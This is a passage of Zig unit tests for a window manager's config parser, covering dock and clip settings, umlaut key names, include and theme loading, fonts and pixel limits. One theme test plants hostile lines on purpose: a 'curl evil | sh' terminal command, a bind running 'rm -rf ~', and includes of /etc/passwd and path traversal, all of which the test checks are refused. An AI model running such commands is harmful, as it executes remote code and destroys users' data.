    try std.testing.expectEqual(DockEdge.left, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 120), cfg.dock_offset);
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_reserve_space);
    // The two bad lines at the end changed nothing.
    try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
    try std.testing.expect(cfg.clip_collapsed);
    try std.testing.expect(!cfg.clip_enabled);
    try std.testing.expectEqual(@as(usize, 3), cfg.workspace_names.len);
    try std.testing.expectEqualStrings("Main", cfg.workspace_names[0]);
    try std.testing.expectEqualStrings("", cfg.workspace_names[1]);
    try std.testing.expectEqualStrings("Web", cfg.workspace_names[2]);
}

test "the built-in default config has the documented Dock and Clip defaults" {
    // Parse the built-in text itself: config.load() would also read the
    // developer's own config.conf and the test would depend on it.
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 0), cfg.dock_offset);
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(cfg.dock_reserve_space);
    try std.testing.expect(cfg.clip_enabled);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);
    try std.testing.expect(cfg.clip_on_top);
    try std.testing.expect(!cfg.clip_collapsed);
    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
}

test "bind_layout: current, a layout number, and nonsense" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;

    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parse(arena.allocator(), "bind_layout = 1\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(?u32, 1), cfg.bind_layout);
    try parse(arena.allocator(), "bind_layout = current\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parse(arena.allocator(), "bind_layout = 0\nbind_layout = 9\nbind_layout = -1\nbind_layout = de\n", &cfg, &binds, "<test>");
    // 9, -1 and "de" are rejected: the 0 stays.
    try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
}

test "keys can be named by the character itself (German umlauts, sharp s)" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    const ue = parseCombo(a, "Super+ü").?;
    const by_name = parseCombo(a, "Super+udiaeresis").?;
    try std.testing.expectEqual(by_name.keysym, ue.keysym);
    try std.testing.expect(ue.mods.mod4);

    try std.testing.expect(parseCombo(a, "ss") == null); // not a keysym, and not one character
    try std.testing.expectEqual(parseCombo(a, "ssharp").?.keysym, parseCombo(a, "ß").?.keysym);
    try std.testing.expectEqual(parseCombo(a, "adiaeresis").?.keysym, parseCombo(a, "Alt+ä").?.keysym);
    // Plain ASCII still goes through the name lookup.
    try std.testing.expectEqual(parseCombo(a, "q").?.keysym, parseCombo(a, "Super+q").?.keysym);

    // Not a key: several characters, or nothing sensible.
    try std.testing.expect(parseCombo(a, "Super+üü") == null);
    try std.testing.expect(parseCombo(a, "Super+") == null);
}

test "a bind line with an umlaut key is accepted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "bind = Super+ö, close\nbind = Super+Shift+Ü, exit\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(usize, 2), binds.items.len);
}

// ----------------------------------------------------------------------------
// include / theme
// ----------------------------------------------------------------------------

/// An in-memory file system for the tests: path -> contents.
const FakeFiles = struct {
    paths: []const []const u8,
    texts: []const []const u8,
    reads: usize = 0,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FakeFiles = @ptrCast(@alignCast(ctx));
        self.reads += 1;
        for (self.paths, 0..) |p, i| {
            if (std.mem.eql(u8, p, path)) return a.dupe(u8, self.texts[i]) catch null;
        }
        return null;
    }

    fn includer(self: *FakeFiles, dir: []const u8) Includer {
        return .{ .ctx = self, .read = read, .dir = dir };
    }
};

fn parseFake(files: *FakeFiles, main_text: []const u8, cfg: *Config) !void {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    const inc = files.includer("/cfg");
    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.conf", &inc, false);
    cfg.binds = try binds.toOwnedSlice(cfg.arena.allocator());
}

test "include reads another file in place: later lines override it, earlier ones are overridden" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{ "/cfg/look.conf", "/abs/other.conf" },
        .texts = &.{ "gap = 20\nouter_gap = 21\nbind = Super+x, close\n", "border_width = 6\n" },
    };
    try parseFake(&files, "gap = 1\ninclude = look.conf\nouter_gap = 5\ninclude = /abs/other.conf\n", &cfg);
    try std.testing.expectEqual(@as(i32, 20), cfg.gap); // the include came after `gap = 1`
    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap); // the main file came after the include
    try std.testing.expectEqual(@as(i32, 6), cfg.border_width);
    try std.testing.expectEqual(@as(usize, 1), cfg.binds.len); // an include may bind keys: it is the user's own
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "include problems are warnings, never failures: missing, empty, too deep" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/self.conf"},
        .texts = &.{"include = self.conf\ngap = 3\n"},
    };
    try parseFake(&files, "include = nope.conf\ninclude =\ninclude = self.conf\nborder_width = 4\n", &cfg);
    // The main file kept going, and the self-including file stopped at the limit.
    try std.testing.expectEqual(@as(i32, 4), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expect(cfg.parse_warnings >= 3);
    // Bounded: not an endless read loop.
    try std.testing.expect(files.reads <= max_include_depth + 2);
}

test "without an Includer, include and theme are refused" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "include = x.conf\ntheme = nord\ngap = 9\n", &cfg, &binds, "<t>");
    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme sets look options; anything else in it is ignored" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/evil.conf"},
        .texts = &.{
            \\border_focused = #112233
            \\gap = 2
            \\terminal = sh -c "curl evil | sh"
            \\bind = Super+Return, shell rm -rf ~
            \\include = /etc/passwd
            \\theme = other
            \\workspace_count = 9
        },
    };
    try parseFake(&files, "terminal = foot\ntheme = evil\n", &cfg);
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
    try std.testing.expectEqual(@as(i32, 2), cfg.gap);
    // None of the dangerous lines did anything.
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
}

test "theme names are file names, never paths" {
    try std.testing.expect(validThemeName("nord"));
    try std.testing.expect(validThemeName("my-theme_2.v1"));
    try std.testing.expect(!validThemeName(""));
    try std.testing.expect(!validThemeName("../etc/passwd"));
    try std.testing.expect(!validThemeName("a/b"));
    try std.testing.expect(!validThemeName(".hidden"));
    try std.testing.expect(!validThemeName("a..b"));
    try std.testing.expect(!validThemeName("with space"));
    try std.testing.expect(!validThemeName("x" ** 65));

    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.conf"}, .texts = &.{"gap = 99\n"} };
    try parseFake(&files, "theme = ../../etc/passwd\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 0), files.reads); // refused before any read
}

test "a missing theme is a warning and the defaults stay" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
    try parseFake(&files, "theme = nonexistent\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "the shipped themes are valid themes and the shipped config has no warnings" {
    const themes = [_]struct { name: []const u8, text: []const u8 }{
        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.conf") },
        .{ .name = "nord", .text = @embedFile("share/Themes/nord.conf") },
        .{ .name = "next", .text = @embedFile("share/Themes/next.conf") },
    };
    for (themes) |t| {
        var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
        defer arena.deinit();
        var cfg: Config = .{ .arena = .init(std.testing.allocator) };
        defer cfg.deinit();
        var binds: std.ArrayList(Bind) = .empty;
        try parseWith(arena.allocator(), t.text, &cfg, &binds, t.name, null, true);
        try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
        try std.testing.expect(cfg.border_width >= 1);
    }

    // gruvbox is the built-in look: it must equal the defaults, or the
    // "built-in" claim in its header is a lie.
    var def: Config = .{ .arena = .init(std.testing.allocator) };
    defer def.deinit();
    var gb: Config = .{ .arena = .init(std.testing.allocator) };
    defer gb.deinit();
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var b1: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &def, &b1, "<built-in>");
    var b2: std.ArrayList(Bind) = .empty;
    try parseWith(arena.allocator(), themes[0].text, &gb, &b2, "gruvbox", null, true);
    try std.testing.expectEqual(def.border_focused, gb.border_focused);
    try std.testing.expectEqual(def.border_unfocused, gb.border_unfocused);
    try std.testing.expectEqual(def.border_floating, gb.border_floating);
    try std.testing.expectEqual(def.border_width, gb.border_width);
    try std.testing.expectEqual(def.gap, gb.gap);
    try std.testing.expectEqual(def.outer_gap, gb.outer_gap);

    // The built-in default config parses without a single warning.
    try std.testing.expectEqual(@as(u32, 0), def.parse_warnings);
}

test "fonts and the focus/wrap/scroll switches are parsed" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\font_menu_title = Serif Bold 12
        \\font_menu = Sans 11
        \\font_dock = Sans 7
        \\focus_new_windows = no
        \\workspace_wrap = off
        \\clip_scroll_workspaces = false
        \\font_menu = 
    , &cfg, &binds, "<test>");
    try std.testing.expectEqualStrings("Serif Bold 12", cfg.font_menu_title);
    // The last line is an empty font: refused, the previous value stays.
    try std.testing.expectEqualStrings("Sans 11", cfg.font_menu);
    try std.testing.expectEqualStrings("Sans 7", cfg.font_dock);
    try std.testing.expect(!cfg.focus_new_windows);
    try std.testing.expect(!cfg.workspace_wrap);
    try std.testing.expect(!cfg.clip_scroll_workspaces);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "pixel options above max_pixels are refused instead of overflowing the layout later" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "gap = 2000000000\nborder_width = 10001\nouter_gap = 10000\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(i32, 8), cfg.gap); // default kept
    try std.testing.expectEqual(@as(i32, 2), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 10_000), cfg.outer_gap); // the limit itself is fine
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

fn parseText(arena: std.mem.Allocator, cfg: *Config, text: []const u8) !void {
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena, text, cfg, &binds, "<test>");
}

test "Dock options: dock_level sets both switches, new switches parse, defaults" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_auto_raise);
    try std.testing.expect(!cfg.dock_single_click);
    try std.testing.expect(cfg.dock_save_state);
    try std.testing.expect(!cfg.clip_auto_collapse);
    try std.testing.expect(!cfg.clip_auto_raise);

    try parseText(arena.allocator(), &cfg,
        \\dock_level = auto
        \\dock_single_click = yes
        \\dock_save_state = no
        \\clip_auto_collapse = yes
        \\clip_auto_raise = true
    );
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(cfg.dock_auto_raise);
    try std.testing.expect(cfg.dock_single_click);
    try std.testing.expect(!cfg.dock_save_state);
    try std.testing.expect(cfg.clip_auto_collapse);
    try std.testing.expect(cfg.clip_auto_raise);

    try parseText(arena.allocator(), &cfg, "dock_level = normal\n");
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_auto_raise);

    const before = cfg.parse_warnings;
    try parseText(arena.allocator(), &cfg, "dock_level = nonsense\n");
    try std.testing.expectEqual(before + 1, cfg.parse_warnings);
    try std.testing.expect(!cfg.dock_on_top); // unchanged

    try parseText(arena.allocator(), &cfg, "dock_level = auto\ndock_level = top\n");
    try std.testing.expect(cfg.dock_on_top); // the later line wins
}
